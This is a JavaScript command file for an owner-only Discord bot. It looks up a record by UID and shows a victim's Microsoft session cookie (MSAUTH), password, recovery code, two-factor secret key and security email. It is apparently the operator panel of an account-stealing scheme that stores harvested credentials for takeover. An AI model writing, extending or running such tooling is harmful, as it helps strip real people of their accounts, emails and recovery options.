const { EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "status",
    ownerOnly: true,
    callback: async (client, interaction) => {
        await interaction.deferReply({ flags: 64 });
        try {
            let uid = interaction.customId.split("|")[1];
            const results = await client.queryParams("SELECT * FROM status WHERE uid = ?", [uid]);
            if (!results || results.length === 0) {
                return interaction.editReply({
                    content: `No status found for UID: ${uid}`,
                });
            }
            const statusData = results[0];

            const emptyBox = '``` ```';

            const embed = new EmbedBuilder()
                .setTitle(`Secure status for UID \`\`${uid}\`\``)
                .addFields(
                    { name: 'MSAUTH Cookie', value: statusData.msauth ? `\`\`\`${statusData.msauth}\`\`\`` : emptyBox, inline: false },
                    { name: 'Username', value: statusData.username ? `\`\`\`${statusData.username}\`\`\`` : emptyBox, inline: false },
                    { name: 'Recovery Code', value: statusData.recoverycode ? `\`\`\`${statusData.recoverycode}\`\`\`` : emptyBox, inline: false },
                    { name: 'Secret Key', value: statusData.secretkey ? `\`\`\`${statusData.secretkey}\`\`\`` : emptyBox, inline: false },
                    { name: 'Primary Email', value: statusData.email ? `\`\`\`${statusData.email}\`\`\`` : emptyBox, inline: true },
                    { name: 'Security Email', value: statusData.secemail ? `\`\`\`${statusData.secemail}\`\`\`` : emptyBox, inline: true },
                    { name: 'Password', value: statusData.password ? `\`\`\`${statusData.password}\`\`\`` : emptyBox, inline: false }
                )
                .setColor('#b2c7e0')
                .setTimestamp();

            await interaction.editReply({
                embeds: [embed],
            });
        } catch (error) {
            console.error('Error fetching status:', error);
            await interaction.editReply({
                content: 'An error occurred while fetching the status.',
            }).catch(() => {});
        }
    },
};
